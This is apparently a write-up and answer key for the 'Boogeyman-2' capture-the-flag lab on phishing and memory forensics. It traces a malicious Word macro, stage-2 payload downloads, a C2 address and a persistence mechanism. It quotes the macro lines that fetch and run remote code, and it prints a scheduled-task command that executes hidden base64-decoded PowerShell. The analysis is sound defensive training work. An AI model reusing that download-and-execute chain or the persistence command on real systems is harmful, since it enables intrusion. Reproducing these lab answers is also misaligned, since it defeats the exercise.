# Boogeyman-2 Investigation

![Room Banner](https://github.com/user-attachments/assets/f8a03eb5-1889-4113-96df-ec72f7230461)

## 📋 Task 1: Introduction

### Investigation Platform

Before we proceed, deploy the attached machine by clicking the Start Machine button in the upper-right-hand corner of the task. It may take up to 3-5 minutes to initialise the services.

The machine will start in a split-screen view. If the VM is not visible, use the blue Show Split View button at the top-right of the page.

### Artefacts

For the investigation, you will be provided with the following artefacts:

- Copy of the phishing email.
- Memory dump of the victim's workstation.

You may find these files in the `/home/ubuntu/Desktop/Artefacts` directory.

## 📧 Task 2: Spear Phishing Human Resources

### Investigation Findings

#### **Q 1. What email was used to send the phishing email?**
**Answer: `westaylor23@outlook.com`**

#### **Q 2. What is the email of the victim employee?**
**Answer: `maxine.beck@quicklogisticsorg.onmicrosoft.com`**

#### **Q 3. What is the name of the attached malicious document?**
**Answer: `Resume_WesleyTaylor.doc`**

![Email Analysis](https://github.com/user-attachments/assets/1ae87f83-c096-4379-837c-27ff08177c96)

Saving the attached file —
![Attachment Save](https://github.com/user-attachments/assets/a3958211-b501-4889-aadb-c5f5157df550)

#### **Q 4. What is the MD5 hash of the malicious attachment?**
**Answer: `52c4384a0b9e248b95804352ebec6c5b`**

![MD5 Hash](https://github.com/user-attachments/assets/b1700cf1-7215-44f0-aafd-781dd04a9e55)

#### **Q 5. What URL is used to download the stage 2 payload based on the document's macro?**
**Answer: `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png`**

#### **Q 6. What is the name of the process that executed the newly downloaded stage 2 payload?**
**Answer: `wscript.exe`**

#### **Q 7. What is the full file path of the malicious stage 2 payload?**
**Answer: `C:\ProgramData\update.js`**

![Memory Analysis](https://github.com/user-attachments/assets/8e7cbebb-c4ea-49f9-80bd-365015509e4d)

### Code Review

- `spath = "C:\ProgramData"`: This sets the variable spath to the path "C:\ProgramData". It seems like this is the destination directory for the downloaded file.
- `Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")`: This creates an instance of the XMLHTTP object, which is commonly used for sending HTTP requests in VBA.
- `Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")`: This creates an instance of the ADODB.Stream object, which is used for working with binary data.
- `xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False`: This opens a GET request to the specified URL ("https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png") and sets it to be a synchronous request (False).
- `xHttp.Send`: This sends the HTTP request.
- `With bStrm ... End With`: This block of code sets up the ADODB.Stream to write the response body (the downloaded content) to a file. It specifies the file path as spath & "\update.js".
- `Set shell_object = CreateObject("WScript.Shell")`: This creates an instance of the WScript.Shell object, which is used for running shell commands.
- `shell_object.Exec ("wscript.exe C:\ProgramData\update.js")`: This executes the command "wscript.exe C:\ProgramData\update.js".

![Process Analysis](https://github.com/user-attachments/assets/0e03fe1c-0ca9-4cf3-b15f-3cba6977660f)

#### **Q 8. What is the PID of the process that executed the stage 2 payload?**
**Answer: `4260`**

#### **Q 9. What is the parent PID of the process that executed the stage 2 payload?**
**Answer: `1124`**

**Command Used:** `vol -f WKSTN-2961.raw windows.pstree.PsTree`

#### **Q 10. What URL is used to download the malicious binary executed by the stage 2 payload?**
**Answer: `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe`**

#### **Q 11. What is the PID of the malicious process used to establish the C2 connection?**
**Answer: `6216`**

#### **Q 12. What is the full file path of the malicious process used to establish the C2 connection?**
**Answer: `C:\Windows\Tasks\updater.exe`**

Reference screenshot for questions 8, 9, 11
![Process Tree](https://github.com/user-attachments/assets/f8ad53ca-c29a-4c5f-87a9-a5efa354c6b2)

Reference screenshot for questions 11, 12
![Malicious Process](https://github.com/user-attachments/assets/609c35bc-5f99-4e3d-b3a0-411a6f6143ee)

#### **Q 13. What is the IP address and port of the C2 connection initiated by the malicious binary? (Format: IP address:port)**
**Answer: `128.199.95.189:8080`**

![C2 Connection](https://github.com/user-attachments/assets/e8aa718a-7865-4c97-88d3-f877913aff94)

#### **Q 14. What is the full file path of the malicious email attachment based on the memory dump?**
**Answer: `C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc`**

**Command Used:** `strings WKSTN-2961.raw | grep Resume`

![Attachment Path](https://github.com/user-attachments/assets/46927b26-8d93-4875-b947-931591bd0556)

#### **Q 15. The attacker implanted a scheduled task right after establishing the c2 callback. What is the full command used by the attacker to maintain persistent access?**
**Answer: `schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"'`**

![Persistence Command](https://github.com/user-attachments/assets/c9e5e0bb-ed15-4db2-b06d-9f97d10a919b)

---

## 🔐 Cybersecurity Badges

<div align="center">
  
![Memory Forensics](https://img.shields.io/badge/Memory-Forensics-blue)
![Phishing Analysis](https://img.shields.io/badge/Phishing-Analysis-red)
![Malware Analysis](https://img.shields.io/badge/Malware-Analysis-orange)
![Incident Response](https://img.shields.io/badge/Incident-Response-green)
![Threat Hunting](https://img.shields.io/badge/Threat-Hunting-purple)
![Digital Forensics](https://img.shields.io/badge/Digital-Forensics-yellow)
![Volatility](https://img.shields.io/badge/Volatility-Analysis-lightgrey)
![C2 Analysis](https://img.shields.io/badge/C2-Analysis-9cf)

</div>

---

## 🛡️ Skills Demonstrated

- **Memory Dump Analysis**
- **Phishing Email Investigation**
- **Malicious Document Analysis**
- **Macro Code Review**
- **Process Tree Analysis**
- **C2 Infrastructure Mapping**
- **Persistence Mechanism Detection**
- **Volatility Framework Usage**
- **Threat Actor TTP Identification**
- **Incident Timeline Reconstruction**

---

<div align="center">

**🔍 Advanced Memory Forensics Completed** | **✅ Full Attack Chain Uncovered** | **🛡️ Sophisticated Persistence Detected**

*This investigation revealed a sophisticated attack chain leveraging malicious documents, multi-stage payloads, and registry-based persistence mechanisms.*

</div>



